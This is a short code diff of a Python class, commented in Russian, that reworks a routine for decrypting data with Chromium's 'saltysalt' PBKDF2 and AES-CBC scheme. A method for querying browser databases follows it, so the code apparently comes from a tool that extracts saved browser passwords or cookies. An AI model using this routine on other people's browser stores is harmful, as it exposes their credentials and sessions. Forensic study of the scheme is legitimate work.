@@ -96,20 +96,31 @@ class Broswer:
 
     def decrypter(self, cipher_text, key):
         try:
-            print(cipher_text, key)
+            # Удаляем первые 3 байта, которые могут быть префиксом
             cipher_text = cipher_text[3:]
+
+            # Декодируем base64
             cipher_text = base64.b64decode(cipher_text)
-            iv = b' ' * 16
+
+            # Генерация ключа из пароля
             key = hashlib.pbkdf2_hmac('sha1', key.encode('utf-8'), b'saltysalt', 1003)[:16]
+
+            # Инициализационный вектор (IV) длиной 16 байт
+            iv = b' ' * 16  # Используем пробелы (0x20) для IV
+
+            # Создаем объект AES с использованием ключа и IV
             cipher = AES.new(key, AES.MODE_CBC, iv)
 
+            # Расшифровываем данные и удаляем паддинг PKCS#7
             decrypted_data = cipher.decrypt(cipher_text)
-            decrypted_data = decrypted_data[:-decrypted_data[-1]]
+            padding_length = decrypted_data[-1]
+            decrypted_data = decrypted_data[:-padding_length]
 
             return decrypted_data.decode('utf-8')
         except Exception as e:
+            print(cipher_text, key)
             print(f"[-] Error decrypting data: {e}")
-            return cipher_text  # Возвращаем исходный текст в случае ошибки
+            return None  # Возвращаем None в случае ошибки
 
               
     def browse_browser_db(self, browser_data_paths, query_type): 
